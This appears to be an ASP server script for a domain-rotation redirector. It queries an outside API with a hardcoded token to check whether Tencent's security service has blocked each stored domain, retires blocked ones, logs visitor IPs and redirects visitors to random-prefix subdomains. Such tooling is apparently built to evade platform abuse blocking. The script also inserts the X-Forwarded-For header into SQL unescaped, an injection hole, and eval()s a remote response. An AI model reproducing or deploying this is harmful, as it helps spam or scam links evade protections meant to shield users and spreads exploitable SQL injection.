<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>

<%Response.Charset="utf-8"%>
<!--#include file="conn.asp"-->


<script language="jscript" runat="server">  
    Array.prototype.get = function(x) { return this[x]; };  
    function parseJSON(strJSON) { return eval("(" + strJSON + ")"); }  
</script> 
<%
dim getyuming,arr,token,url,data,rs,time,tempday,uptime,sql,arrs,pre


     '通用函数：如果不能取客户端真实IP，就会取客户端的代理IP  
Function getIP()  
Dim strIPAddr  
If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then 
 strIPAddr = Request.ServerVariables("REMOTE_ADDR")  
ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then 
 strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)  
ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then 
 strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)  
Else 
 strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")  
End If 
getIP = Trim(Mid(strIPAddr, 1, 30))  
End Function

'获取数据库表中定义的域名前缀
preexec="select top 1 * from prefix ORDER BY Rnd(ID)"
set pre=server.createobject("adodb.recordset")
pre.open preexec,conn,1,1
prename=pre("prefixname")
pre.close
set pre=nothing

set rs = conn.execute("select top 1 * from yumingtab where ymzhuangtai=0 ORDER BY Rnd(ID)")

if not rs.eof then
  time=rs("time")
  arrs=rs("yuming")
  tempday=dateDiff("n",time,Now)
  if tempday >=3 then
    
    arr=rs("yuming")
    token = "45108feec55e652690c820091b8893b324c73bd7"
    url="http://api.new.urlzt.com/api/vx?token=" + token + "&url=" + arr
      
    data=getHTTPPage(url)
      
    Set data = parseJSON(data)  
    
    dim msg
    msg=data.msg
    if InstrRev(msg, "腾讯管家拦截")>0  then
      exec="select * from yumingtab where id="&rs("id")
      set rss=server.createobject("adodb.recordset")
      rss.open exec,conn,1,3
    
      rss("yuming")=rs("yuming")
      rss("ymzhuangtai")=1
      rss.update
      rss.close
      set rss=nothing
      Response.Write("<script>window.location.href=window.location.href;</script>")
      
	else
        '保存访问者IP地址
        exec="insert into iptablist(IPText) values('"+getIP+"')"
        conn.execute exec
        conn.close
        set conn=nothing

	  Response.Redirect("http://"+prename+"."+arr)
      Response.End
    end if
    
  else
    '保存访问者IP地址
        exec="insert into iptablist(IPText) values('"+getIP+"')"
        conn.execute exec
        conn.close
        set conn=nothing

    Response.Redirect("http://"+prename+"."+arrs)
    Response.End
  end if
end if

Function randomStr(intLength) 
Dim strSeed, seedLength, pos, Str, i 
strSeed = "abcdefghijklmnopqrstuvwxyz1234567890" 
seedLength = Len(strSeed) 
Str = "" 
Randomize 
For i = 1 To intLength 
Str = Str + Mid(strSeed, Int(seedLength * Rnd) + 1, 1) 
Next 
randomStr = Str 
End Function

function getHTTPPage(url)
dim Http
set Http=server.createobject("MSXML2.XMLHTTP")
Http.open "GET",url,false
Http.send()
if Http.readystate<>4 then 
  exit function
end if
getHTTPPage=bytesToBSTR(Http.responseBody,"UTF-8")
set http=nothing
if err.number<>0 then err.Clear 
end function

Function BytesToBstr(body,Cset)
  dim objstream
  set objstream = Server.CreateObject("adodb.stream")
  objstream.Type = 1
  objstream.Mode =3
  objstream.Open
  objstream.Write body
  objstream.Position = 0
  objstream.Type = 2
  objstream.Charset = Cset
  BytesToBstr = objstream.ReadText 
  objstream.Close
  set objstream = nothing
End Function

%>

<%
rs.close
set rs=nothing
conn.close
set conn=nothing
%>
